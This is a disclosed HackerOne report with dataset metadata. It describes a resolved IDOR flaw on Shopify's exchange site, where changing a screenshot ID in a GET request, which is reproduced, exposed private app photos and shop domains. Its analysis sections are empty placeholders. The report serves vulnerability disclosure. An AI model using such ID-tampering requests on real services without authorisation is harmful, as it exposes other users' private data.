---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '318751'
original_report_id: '318751'
title: Access to Private Photos of Apps in App section(IDOR)
weakness: Insecure Direct Object Reference (IDOR)
team_handle: shopify
created_at: '2018-02-22T20:01:57.103Z'
disclosed_at: '2018-03-05T19:34:35.107Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
asset_identifier: exchangemarketplace.com
asset_type: URL
max_severity: medium
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# Access to Private Photos of Apps in App section(IDOR)

## Metadata

- HackerOne Report ID: 318751
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: shopify
- Disclosed At: 2018-03-05T19:34:35.107Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

##Bug location :
 https://[MyShop].myshopify.com/admin/apps

##Description : 
Previewing the Photo In App section Request is vulnerable to IDOR attack where changing the ID leads to Disclose Link of Private photos. Also It discloses the Shop Domain details also. The request goes through exchange.shopify.com. 

##Vulnerable Request : 
GET /listings/hackeronevg1110/shop_screenshots/85952 HTTP/1.1
Host: exchange.shopify.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: [Cookies]
Connection: close
Upgrade-Insecure-Requests: 1


Let me know if you need more info.

Regards,
Vijay Kumar

## Impact

Information disclosure.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
